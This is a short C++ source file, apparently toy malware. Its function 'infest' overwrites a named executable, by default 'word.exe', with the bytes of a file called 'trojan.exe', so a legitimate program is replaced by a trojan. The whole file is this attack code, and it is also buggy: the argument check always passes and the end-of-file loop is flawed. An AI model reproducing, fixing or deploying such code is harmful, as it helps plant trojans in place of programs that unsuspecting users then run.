#include<fstream.h>


void infest(char *name);

void main(int argc,char **argv)
{
   if(argc)
      infest(argv[1]);
   else
   {
      infest("word.exe");
   }
}

void infest(char *name)
{
   ifstream fin;
   ofstream fout;
   char temp;
   fout.open(name);
   fin.open("trojan.exe");
   while(!fin.eof())
   {
      fin.get(temp);
      fout<<temp;
   }
   fin.close();
   fout.close();
}

